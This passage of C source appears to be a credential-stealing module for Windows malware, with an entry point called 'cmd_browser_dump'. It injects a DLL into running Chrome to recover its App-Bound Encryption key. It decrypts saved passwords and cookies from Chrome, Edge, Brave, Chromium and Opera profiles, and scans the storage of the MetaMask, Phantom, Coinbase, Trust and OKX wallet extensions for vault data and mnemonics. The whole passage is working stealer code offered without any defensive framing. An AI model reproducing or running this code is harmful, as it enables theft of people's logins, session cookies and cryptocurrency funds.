    char shm_name[64], evt_name[64];
    snprintf(shm_name, sizeof(shm_name), "ChromeKeyExtract_%lu",
             (unsigned long)chrome_pid);
    snprintf(evt_name, sizeof(evt_name), "ChromeKeyDone_%lu",
             (unsigned long)chrome_pid);

    /* shared memory */
    HANDLE hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,
                                      PAGE_READWRITE, 0,
                                      sizeof(_chrome_shm_t), shm_name);
    if (!hMap) return -1;

    _chrome_shm_t *shm = (_chrome_shm_t *)MapViewOfFile(
        hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (!shm) { CloseHandle(hMap); return -1; }

    memset(shm, 0, sizeof(*shm));
    shm->magic = _CHROME_SHM_MAGIC;
    memcpy(shm->nonce, hint->nonce, 12);
    memcpy(shm->ct,    hint->ct, hint->ct_len);
    shm->ct_len = (uint32_t)hint->ct_len;
    memcpy(shm->tag,   hint->tag, 16);

    HANDLE hEvt = CreateEventA(NULL, FALSE, FALSE, evt_name);
    if (!hEvt) {
        UnmapViewOfFile(shm); CloseHandle(hMap); return -1;
    }

    /* drop DLL blob to temp */
    char tmp[MAX_PATH], dll_path[MAX_PATH];
    GetTempPathA(sizeof(tmp), tmp);
    snprintf(dll_path, sizeof(dll_path), "%s~ck%08lx.dll", tmp,
             (unsigned long)GetTickCount());

    int ok = -1;
    HANDLE hf = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) goto cleanup;
    DWORD wr = 0;
    WriteFile(hf, chrome_key_helper_dll, chrome_key_helper_dll_len, &wr, NULL);
    CloseHandle(hf);
    if (wr != chrome_key_helper_dll_len) { DeleteFileA(dll_path); goto cleanup; }

    /* open browser process */
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, chrome_pid);
    if (!hp) { DeleteFileA(dll_path); goto cleanup; }

    /* write DLL path into Chrome's address space */
    size_t path_len = strlen(dll_path) + 1;
    LPVOID remote_path = VirtualAllocEx(hp, NULL, path_len,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
    if (remote_path) {
        SIZE_T nw = 0;
        if (WriteProcessMemory(hp, remote_path, dll_path, path_len, &nw)
            && nw == path_len) {
            HMODULE k32 = GetModuleHandleA("kernel32.dll");
            LPTHREAD_START_ROUTINE pLLA = k32 ?
                (LPTHREAD_START_ROUTINE)GetProcAddress(k32, "LoadLibraryA")
                : NULL;
            if (pLLA) {
                HANDLE ht = CreateRemoteThread(hp, NULL, 0, pLLA,
                                               remote_path, 0, NULL);
                if (ht) {
                    /* wait up to 30 s for DLL to signal the event */
                    if (WaitForSingleObject(hEvt, 30000) == WAIT_OBJECT_0
                        && shm->found) {
                        memcpy(key_out, (const uint8_t *)shm->key, 32);
                        ok = 0;
                    }
                    WaitForSingleObject(ht, 5000);
                    CloseHandle(ht);
                }
            }
        }
        VirtualFreeEx(hp, remote_path, 0, MEM_RELEASE);
    }
    CloseHandle(hp);
    DeleteFileA(dll_path);

cleanup:
    SecureZeroMemory(shm, sizeof(*shm));
    UnmapViewOfFile(shm);
    CloseHandle(hMap);
    CloseHandle(hEvt);
    return ok;
}

#endif /* HAVE_CHROME_INJECT */

/* ── logins table row callback ───────────────────────────────────────── */

typedef struct
{
    const uint8_t *mk;
    int have_mk;
    const uint8_t *v20mk;
    int have_v20mk;
    char *out;
    size_t outsz;
    size_t *pos;
    const char *bname;
    const char *pname;
} _login_ctx_t;

static void _login_cb(void *ctx_, const _sq_row_t *row)
{
    _login_ctx_t *ctx = (_login_ctx_t *)ctx_;
    if (row->n < 6)
        return;
    if (*ctx->pos + 256 >= ctx->outsz)
        return;

    /* col 0: origin_url TEXT */
    if (!(row->type[0] >= 13 && (row->type[0] & 1)))
        return;
    char url[512] = {0};
    size_t ulen = row->len[0] < sizeof(url) - 1 ? row->len[0] : sizeof(url) - 1;
    memcpy(url, row->val[0], ulen);

    /* col 3: username_value TEXT (may be empty) */
    char user[256] = {0};
    if (row->type[3] >= 13 && (row->type[3] & 1) && row->len[3] > 0)
    {
        size_t uu = row->len[3] < sizeof(user) - 1 ? row->len[3] : sizeof(user) - 1;
        memcpy(user, row->val[3], uu);
    }

    /* col 5: password_value BLOB */
    char pass[1024] = {0};
    if (row->len[5] > 0)
        _decrypt_pw(ctx->mk, ctx->have_mk,
                    ctx->v20mk, ctx->have_v20mk,
                    row->val[5], row->len[5],
                    pass, sizeof(pass));

    if (!url[0])
        return;

    int n = snprintf(ctx->out + *ctx->pos, ctx->outsz - *ctx->pos,
                     "[%s/%s] %s | %s | %s\n",
                     ctx->bname, ctx->pname, url, user, pass);
    if (n > 0)
        *ctx->pos += (size_t)n;

    SecureZeroMemory(pass, sizeof(pass));
}

/* ── per-profile dump ────────────────────────────────────────────────── */

static void _dump_profile(const char *bname, const char *pname,
                          const uint8_t *mk, int have_mk,
                          const uint8_t *v20mk, int have_v20mk,
                          const char *db_path,
                          char *out, size_t outsz, size_t *pos)
{
    char tmp[MAX_PATH] = {0};
    if (_copy_to_temp(db_path, tmp, sizeof(tmp)) != 0)
        return;

    size_t db_sz = 0;
    uint8_t *db_data = _read_file(tmp, &db_sz);
    DeleteFileA(tmp);
    if (!db_data)
        return;

    /* SQLite magic */
    if (db_sz < 100 || memcmp(db_data, "SQLite format 3\000", 16) != 0)
    {
        free(db_data);
        return;
    }

    _sq_db_t db;
    db.data = db_data;
    db.size = db_sz;
    uint16_t pgsz = _be16(db_data + 16);
    db.page_size = (pgsz == 1) ? 65536u : (uint32_t)pgsz;
    if (db.page_size < 512 || db.page_size > 65536)
    {
        free(db_data);
        return;
    }

    /* find logins table */
    _sq_find_t find = {"logins", 0};
    _sq_walk(&db, 1, 0, _sq_find_cb, &find);
    if (find.rootpage == 0)
    {
        free(db_data);
        return;
    }

    _login_ctx_t lctx = {
        .mk = mk,
        .have_mk = have_mk,
        .v20mk = v20mk,
        .have_v20mk = have_v20mk,
        .out = out,
        .outsz = outsz,
        .pos = pos,
        .bname = bname,
        .pname = pname,
    };
    _sq_walk(&db, find.rootpage, 0, _login_cb, &lctx);
    free(db_data);
}

/* ── crypto wallet extension scanner ────────────────────────────────── */

static const struct { const char *name; const char *id; } CRYPTO_EXT[] = {
    {"TrustWallet", "egjidjbpglichdcondbcbdnbeeppgdph"},
    {"MetaMask",    "nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"Phantom",     "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"Coinbase",    "hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"OKXWallet",   "mcohilncbfahbmgdjkbpemcciiolgcge"},
};

/* Scan one LevelDB directory for wallet vault JSON blobs */
static int _scan_ext_ldb(const char *dir, const char *ext_name,
                          const char *browser, const char *profile,
                          char *out, size_t outsz, size_t *pos)
{
    static const char *MARKERS[] = {
        "\"cipher\":\"aes-256-cbc",   /* MetaMask — trailing " may be binary in LDB */
        "\"cipher\":\"aes-128-ctr",   /* Trust Wallet / Ethereum keystore V3 */
        "\"ciphertext\":",
        "\"mnemonic\":",
        NULL
    };

    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    int total = 0;
    do {
        const char *dot = strrchr(fd.cFileName, '.');
        if (!dot) continue;
        if (_stricmp(dot, ".log") != 0 && _stricmp(dot, ".ldb") != 0) continue;

        char fpath[MAX_PATH];
        snprintf(fpath, sizeof(fpath), "%s\\%s", dir, fd.cFileName);

        HANDLE hfile = CreateFileA(fpath, GENERIC_READ,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL, OPEN_EXISTING, 0, NULL);
        if (hfile == INVALID_HANDLE_VALUE) continue;

        LARGE_INTEGER li = {0};
        GetFileSizeEx(hfile, &li);
        if (li.QuadPart == 0 || li.QuadPart > 4 * 1024 * 1024) {
            CloseHandle(hfile);
            continue;
        }
        uint8_t *buf = (uint8_t *)malloc((size_t)li.QuadPart + 1);
        if (!buf) { CloseHandle(hfile); continue; }
        DWORD rd = 0;
        ReadFile(hfile, buf, (DWORD)li.QuadPart, &rd, NULL);
        CloseHandle(hfile);
        buf[rd] = 0;

        int found_in_file = 0;
        for (int m = 0; MARKERS[m] && !found_in_file; m++) {
            size_t mlen = strlen(MARKERS[m]);
            for (size_t i = 0; i + mlen <= rd && !found_in_file; i++) {
                if (memcmp(buf + i, MARKERS[m], mlen) != 0) continue;

                /* walk back to '{' or '[' (Trust Wallet vault is in an array) */
                size_t js = i;
                while (js > 0 && buf[js] != '{' && buf[js] != '[') js--;
                if (buf[js] != '{' && buf[js] != '[') continue;
                char open = (char)buf[js];
                char close = (open == '[') ? ']' : '}';

                /* walk forward to matching close bracket, tracking nesting */
                size_t je = js;
                int depth = 0;
                while (je < rd) {
                    if ((char)buf[je] == open) depth++;
                    else if ((char)buf[je] == close) { if (--depth == 0) { je++; break; } }
                    je++;
                }
                if (depth != 0) continue;

                size_t jlen = je - js;
                if (jlen < 10 || jlen > 16384) continue;

                /* Sanitize: replace binary bytes with '?' to keep output printable */
                char san[16384];
                size_t slen = jlen < sizeof(san) - 1 ? jlen : sizeof(san) - 1;
                for (size_t k = 0; k < slen; k++) {
                    uint8_t b = buf[js + k];
                    san[k] = (b >= 0x20 && b < 0x7f) ? (char)b : '?';
                }
                san[slen] = 0;

                size_t avail = outsz - *pos - 1;
                int n = snprintf(out + *pos, avail,
                    "[wallet] %s/%s/%s: %s\n",
                    browser, profile, ext_name, san);
                if (n > 0) *pos += (n < (int)avail) ? (size_t)n : avail;
                total++;
                found_in_file = 1;
            }
        }
        free(buf);
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    return total;
}

/* Scan all known crypto extensions for a profile */
static void _dump_wallets(const char *browser, const char *profile,
                           const char *ud, int use_profiles,
                           char *out, size_t outsz, size_t *pos)
{
    char base[MAX_PATH];
    if (use_profiles)
        snprintf(base, sizeof(base), "%s\\%s\\Local Extension Settings", ud, profile);
    else
        snprintf(base, sizeof(base), "%s\\Default\\Local Extension Settings", ud);

    if (GetFileAttributesA(base) == INVALID_FILE_ATTRIBUTES) return;

    for (int i = 0; i < (int)(sizeof(CRYPTO_EXT) / sizeof(CRYPTO_EXT[0])); i++) {
        char extdir[MAX_PATH];
        snprintf(extdir, sizeof(extdir), "%s\\%s", base, CRYPTO_EXT[i].id);
        if (GetFileAttributesA(extdir) == INVALID_FILE_ATTRIBUTES) continue;
        _scan_ext_ldb(extdir, CRYPTO_EXT[i].name, browser, profile, out, outsz, pos);
    }
}

/* ── cookie dump ─────────────────────────────────────────────────────── */

typedef struct {
    const uint8_t *mk;
    int            have_mk;
    const uint8_t *v20mk;
    int            have_v20mk;
    char          *out;
    size_t         outsz;
    size_t        *pos;
    const char    *bname;
    const char    *pname;
} _cookie_ctx_t;

static int _is_enc_blob(const uint8_t *b, uint32_t l)
{
    if (l >= 3 && (memcmp(b,"v10",3)==0 || memcmp(b,"v11",3)==0 || memcmp(b,"v20",3)==0))
        return 1;
    /* DPAPI blob header */
    if (l >= 6 && b[0]==0x01 && b[1]==0x00 && b[2]==0x00 && b[3]==0x00 &&
        b[4]==0xd0 && b[5]==0x8c)
        return 1;
    return 0;
}

static void _cookie_cb(void *ctx_, const _sq_row_t *row)
{
    _cookie_ctx_t *ctx = (_cookie_ctx_t *)ctx_;
    if (*ctx->pos + 512 >= ctx->outsz)
        return;

    /*
     * Cookie table schema by Chrome version:
     * New (Chrome 108+): creation|host|top_frame|name|value|enc_value|path|...  (n>=6)
     * Old (< Chrome 108): creation|host|name|value|enc_value|path|...           (n>=5)
     * Detect by checking which column holds the encrypted blob.
     */
    int host_col, name_col, val_col, enc_col, path_col;
    if (row->n >= 6 &&
        (row->len[5] == 0 || _is_enc_blob(row->val[5], row->len[5]))) {
        host_col = 1; name_col = 3; val_col = 4; enc_col = 5; path_col = 6;
    } else if (row->n >= 5 &&
               (row->len[4] == 0 || _is_enc_blob(row->val[4], row->len[4]))) {
        host_col = 1; name_col = 2; val_col = 3; enc_col = 4; path_col = 5;
    } else return;

    /* host_key must be non-empty TEXT */
    if (!(row->type[host_col] >= 13 && (row->type[host_col] & 1))) return;
    if (row->len[host_col] == 0) return;

    char host[256] = {0};
    size_t hl = row->len[host_col] < sizeof(host)-1 ? row->len[host_col] : sizeof(host)-1;
    memcpy(host, row->val[host_col], hl);

    char cname[256] = {0};
    if (row->n > name_col && row->type[name_col] >= 13 && (row->type[name_col] & 1))
    {
        size_t nl = row->len[name_col] < sizeof(cname)-1 ? row->len[name_col] : sizeof(cname)-1;
        memcpy(cname, row->val[name_col], nl);
    }

    char path[128] = "/";
    if (row->n > path_col && row->type[path_col] >= 13 && (row->type[path_col] & 1) &&
        row->len[path_col] > 0)
    {
        size_t pl = row->len[path_col] < sizeof(path)-1 ? row->len[path_col] : sizeof(path)-1;
        memcpy(path, row->val[path_col], pl);
        path[pl] = 0;
    }

    char value[4096] = {0};
    int got_val = 0;
    if (row->n > enc_col && row->len[enc_col] > 0) {
        got_val = (_decrypt_pw(ctx->mk, ctx->have_mk,
                               ctx->v20mk, ctx->have_v20mk,
                               row->val[enc_col], row->len[enc_col],
                               value, sizeof(value)) == 0);
    }
    if (!got_val && row->n > val_col &&
        row->type[val_col] >= 13 && (row->type[val_col] & 1) && row->len[val_col] > 0)
    {
        size_t vl = row->len[val_col] < sizeof(value)-1 ? row->len[val_col] : sizeof(value)-1;
        memcpy(value, row->val[val_col], vl);
    }

    size_t avail = ctx->outsz - *ctx->pos - 1;
    int n = snprintf(ctx->out + *ctx->pos, avail,
                     "[cookie] %s/%s | %s | %s | %s | %s\n",
                     ctx->bname, ctx->pname, host, cname, path, value);
    if (n > 0) *ctx->pos += (size_t)n < avail ? (size_t)n : avail;

    SecureZeroMemory(value, sizeof(value));
}

static void _dump_cookies_profile(const char *bname, const char *pname,
                                   const uint8_t *mk, int have_mk,
                                   const uint8_t *v20mk, int have_v20mk,
                                   const char *db_path,
                                   char *out, size_t outsz, size_t *pos)
{
    char tmp[MAX_PATH] = {0};
    if (_copy_to_temp(db_path, tmp, sizeof(tmp)) != 0)
        return;

    size_t db_sz = 0;
    uint8_t *db_data = _read_file(tmp, &db_sz);
    DeleteFileA(tmp);
    if (!db_data) return;

    if (db_sz < 100 || memcmp(db_data, "SQLite format 3\000", 16) != 0) {
        free(db_data); return;
    }

    _sq_db_t db;
    db.data = db_data;
    db.size = db_sz;
    uint16_t pgsz = _be16(db_data + 16);
    db.page_size = (pgsz == 1) ? 65536u : (uint32_t)pgsz;
    if (db.page_size < 512 || db.page_size > 65536) { free(db_data); return; }

    _sq_find_t find = {"cookies", 0};
    _sq_walk(&db, 1, 0, _sq_find_cb, &find);
    if (!find.rootpage) { free(db_data); return; }

    _cookie_ctx_t cctx = {
        .mk = mk,      .have_mk = have_mk,
        .v20mk = v20mk, .have_v20mk = have_v20mk,
        .out = out, .outsz = outsz, .pos = pos,
        .bname = bname, .pname = pname,
    };
    _sq_walk(&db, find.rootpage, 0, _cookie_cb, &cctx);
    free(db_data);
}

/* Try Network\Cookies first (Chrome 96+), fall back to Cookies */
static int _find_cookies_db(const char *ud, const char *profile,
                              char *out, size_t outsz)
{
    snprintf(out, outsz, "%s\\%s\\Network\\Cookies", ud, profile);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 0;
    snprintf(out, outsz, "%s\\%s\\Cookies", ud, profile);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 0;
    return -1;
}

/* ── browser enumeration ─────────────────────────────────────────────── */

/* use_profiles=1: Login Data in <ud>\Default\ and <ud>\Profile N\
   use_profiles=0: Login Data directly in <ud> (Opera) */
static void _dump_browser(const char *name,
                          const char *ud_tmpl, int use_profiles,
                          const char *proc_name,
                          char *out, size_t outsz, size_t *pos)
{
    char ud[MAX_PATH] = {0};
    ExpandEnvironmentStringsA(ud_tmpl, ud, sizeof(ud));

    if (GetFileAttributesA(ud) == INVALID_FILE_ATTRIBUTES)
        return;

    uint8_t mk[32] = {0};
    int have_mk = (_get_master_key(ud, mk) == 0);
    uint8_t v20mk[32] = {0};
    int have_v20mk = (_get_v20_master_key(ud, v20mk) == 0);

    /*
     * v20 fallback path (Chrome 127+ App-Bound Encryption):
     *  1. External memory scan — works on Chrome 127-129 (key in plaintext).
     *  2. DLL injection into Chrome browser process — works on Chrome 130+
     *     (BCryptProtectMemory'd key, requires running as same user as Chrome
     *     and HAVE_CHROME_INJECT built; no ACG/CIG on browser proc).
     * Both require a running chrome.exe to hold the decrypted key.
     */
    if (!have_v20mk) {
        char hint_db[MAX_PATH] = {0};
        if (use_profiles)
            snprintf(hint_db, sizeof(hint_db), "%s\\Default\\Login Data", ud);
        else
            snprintf(hint_db, sizeof(hint_db), "%s\\Login Data", ud);

        if (GetFileAttributesA(hint_db) != INVALID_FILE_ATTRIBUTES) {
            _v20_hint_t hint;
            memset(&hint, 0, sizeof(hint));
            if (_extract_v20_hint(hint_db, &hint) == 0) {
                /* Step 1: external scan (Chrome 127-129, no BCrypt protection) */
                have_v20mk = (_scan_chrome_memory(&hint, proc_name, v20mk) == 0);

#ifdef HAVE_CHROME_INJECT
                /* Step 2: injection (Chrome 130+, BCrypt-protected key) */
                if (!have_v20mk) {
                    DWORD bpid = _find_browser_pid(proc_name);
                    if (bpid)
                        have_v20mk = (_inject_v20_chrome(bpid, &hint, v20mk) == 0);
                }
#endif
            }
        }
    }

    if (!use_profiles)
    {
        /* direct: Login Data is in ud itself (Opera, OperaGX) */
        char db[MAX_PATH];
        snprintf(db, sizeof(db), "%s\\Login Data", ud);
        if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
            _dump_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                          db, out, outsz, pos);
        char cdb[MAX_PATH];
        if (_find_cookies_db(ud, "Default", cdb, sizeof(cdb)) == 0)
            _dump_cookies_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                                  cdb, out, outsz, pos);
        _dump_wallets(name, "Default", ud, 0, out, outsz, pos);
        SecureZeroMemory(mk, sizeof(mk));
        SecureZeroMemory(v20mk, sizeof(v20mk));
        return;
    }

    /* Default profile */
    {
        char db[MAX_PATH];
        snprintf(db, sizeof(db), "%s\\Default\\Login Data", ud);
        if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
            _dump_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                          db, out, outsz, pos);
        char cdb[MAX_PATH];
        if (_find_cookies_db(ud, "Default", cdb, sizeof(cdb)) == 0)
            _dump_cookies_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                                  cdb, out, outsz, pos);
        _dump_wallets(name, "Default", ud, 1, out, outsz, pos);
    }

    /* Profile N directories */
    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\Profile *", ud);
    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                continue;
            char db[MAX_PATH];
            snprintf(db, sizeof(db), "%s\\%s\\Login Data", ud, fd.cFileName);
            if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
                _dump_profile(name, fd.cFileName,
                              mk, have_mk, v20mk, have_v20mk,
                              db, out, outsz, pos);
            char cdb[MAX_PATH];
            if (_find_cookies_db(ud, fd.cFileName, cdb, sizeof(cdb)) == 0)
                _dump_cookies_profile(name, fd.cFileName, mk, have_mk, v20mk, have_v20mk,
                                      cdb, out, outsz, pos);
            _dump_wallets(name, fd.cFileName, ud, 1, out, outsz, pos);
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
    }

    SecureZeroMemory(mk, sizeof(mk));
    SecureZeroMemory(v20mk, sizeof(v20mk));
}

/* ── public entry point ──────────────────────────────────────────────── */

int cmd_browser_dump(const char *args, char *output_buf, size_t output_size)
{
    (void)args;

    static const struct
    {
        const char *name;
        const char *path;
        int use_profiles;
        const char *proc;
    } BROWSERS[] = {
        {"Chrome",   "%LOCALAPPDATA%\\Google\\Chrome\\User Data",            1, "chrome.exe"},
        {"Edge",     "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",           1, "msedge.exe"},
        {"Brave",    "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data", 1, "brave.exe"},
        {"Chromium", "%LOCALAPPDATA%\\Chromium\\User Data",                  1, "chromium.exe"},
        {"Opera",    "%APPDATA%\\Opera Software\\Opera Stable",              0, "opera.exe"},
        {"OperaGX",  "%APPDATA%\\Opera Software\\Opera GX Stable",          0, "opera.exe"},
    };

    size_t pos = 0;
    for (int i = 0; i < (int)(sizeof(BROWSERS) / sizeof(BROWSERS[0])); i++)
    {
        if (pos + 64 >= output_size)
            break;
        _dump_browser(BROWSERS[i].name, BROWSERS[i].path,
                      BROWSERS[i].use_profiles, BROWSERS[i].proc,
                      output_buf, output_size, &pos);
    }

    if (pos == 0)
    {
        snprintf(output_buf, output_size, "[browser] no credentials found\n");
        return 1;
    }

    output_buf[pos] = 0;
    return 0;
}
